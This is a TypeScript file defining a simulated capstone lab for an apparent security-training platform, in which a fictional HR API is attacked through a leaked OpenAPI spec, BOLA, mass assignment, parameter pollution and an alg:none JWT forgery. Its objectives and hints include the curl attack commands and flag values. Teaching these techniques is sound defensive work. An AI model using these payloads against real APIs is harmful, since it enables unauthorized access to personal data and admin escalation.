import { dir } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker() {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir({}) }) };
}

/** API module capstone: one continuous five-flag chain against a single HR platform API — spec discovery,
 *  BOLA, mass assignment, HTTP parameter pollution, and a JWT alg:none forgery reaching an undocumented
 *  admin endpoint — covering five distinct OWASP API Security Top 10 categories in one narrative instead
 *  of five isolated single-vulnerability labs. Every mechanic (curl+vulnRoutes, including HPP modeled by
 *  a repeated query param where the last value silently wins) is already established elsewhere on this
 *  platform. */
export const apiCapstoneLabs: LabScenario[] = [
  {
    id: 'api-capstone-openapi-leak-to-forged-admin-jwt',
    title: 'Capstone: OpenAPI Spec Leak to Forged-Admin Endpoint Access',
    difficulty: 'Hard',
    category: 'API',
    briefing:
      "Fenwick HR's peoplesync-api exposes its full OpenAPI spec at a predictable path — including an " +
      'undocumented bulk-update endpoint never meant to be reachable outside internal tooling. From that one ' +
      'discovery, four distinct OWASP API Security Top 10 categories chain together: broken object-level ' +
      'authorization on a salary-lookup endpoint, mass assignment on a profile update, HTTP parameter pollution ' +
      'defeating a department-scoped search filter, and finally a forged JWT reaching the undocumented endpoint ' +
      'the spec leaked in the first place.',
    objectives: [
      { text: 'curl 10.10.250.5/openapi.json and capture the first flag', why: 'A leaked API spec is a map of the entire attack surface, including endpoints never linked from any documented client — exactly the undocumented bulk-update path this chain ends on.' },
      { text: 'curl "http://10.10.250.5/v2/employees/salary?employee_id=90211" and capture the second flag', why: 'OWASP API1:2023 Broken Object Level Authorization — the endpoint returns whatever employee_id is requested with no check that it belongs to the caller.' },
      { text: 'curl -X POST -d "employee_id=self&is_admin=true" http://10.10.250.5/v2/employees/profile and capture the third flag', why: "OWASP API6:2023 (Mass Assignment / unrestricted access to sensitive properties) — is_admin was never meant to be a client-settable field on a self-service profile update." },
      { text: 'curl "http://10.10.250.5/v2/employees/search?department=eng&department=all-departments-internal" and capture the fourth flag', why: "HTTP Parameter Pollution: the backend silently uses the LAST occurrence of a duplicated query parameter — a filter meant to scope results to one department is defeated by simply repeating it with a broader value." },
      { text: 'curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ." http://10.10.250.5/v2/admin/users/bulk-update and capture the final flag', why: 'A JWT with alg set to "none" and an empty signature — the verification routine sees "none" and skips signature checking entirely, trusting the forged admin claim outright on the exact undocumented endpoint the leaked spec first revealed.' },
    ],
    hints: [
      'curl 10.10.250.5/openapi.json',
      'curl "http://10.10.250.5/v2/employees/salary?employee_id=90211"',
      'curl -X POST -d "employee_id=self&is_admin=true" http://10.10.250.5/v2/employees/profile',
      'curl "http://10.10.250.5/v2/employees/search?department=eng&department=all-departments-internal"',
      'curl -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ." http://10.10.250.5/v2/admin/users/bulk-update',
    ],
    totalFlags: 5,
    attacker: attacker(),
    network: [
      {
        hostname: 'peoplesync-api',
        ip: '10.10.250.5',
        os: 'Ubuntu 22.04 (Node.js/Express HR API platform)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (peoplesync-api)',
            http: {
              '/openapi.json':
                '{"paths":{"/v2/employees/salary":{},"/v2/employees/profile":{},"/v2/employees/search":{},' +
                '"/v2/admin/users/bulk-update":{"description":"INTERNAL ONLY — never linked from any documented client"}},' +
                '"flag":"flag{leaked_openapi_spec_reveals_undocumented_admin_endpoint}"}',
            },
            vulnRoutes: [
              {
                kind: 'idor',
                path: '/v2/employees/salary',
                param: 'employee_id',
                triggerSubstrings: ['90211'],
                vulnerableResponse: '{"employee_id":90211,"name":"R. Delgado","salary_usd":142000,"flag":"flag{salary_endpoint_bola_no_ownership_check}"}',
                normalResponse: '{"error":"employee not found for this session"}',
              },
              {
                kind: 'mass-assignment',
                path: '/v2/employees/profile',
                param: 'is_admin',
                triggerSubstrings: ['true'],
                vulnerableResponse: '{"status":"updated","employee_id":"self","is_admin":true,"flag":"flag{profile_update_mass_assignment_is_admin_escalation}"}',
                normalResponse: '{"status":"updated","fields":["display_name"]}',
              },
              {
                kind: 'hpp',
                path: '/v2/employees/search',
                param: 'department',
                triggerSubstrings: ['all-departments-internal'],
                vulnerableResponse: '{"status":"ok","results":4471,"scope":"ALL DEPARTMENTS","flag":"flag{http_parameter_pollution_last_value_wins_defeats_department_scope}"}',
                normalResponse: '{"status":"ok","results":38,"scope":"eng"}',
              },
              {
                kind: 'auth-bypass',
                path: '/v2/admin/users/bulk-update',
                param: 'Authorization',
                location: 'header',
                triggerSubstrings: ['eyjhbgcioijub25lin0'],
                vulnerableResponse: '{"status":"authorized","role":"admin","note":"alg:none skips signature verification entirely","flag":"flag{jwt_alg_none_forgery_reaches_undocumented_admin_endpoint}"}',
                normalResponse: '{"error":"401 unauthorized"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },
];
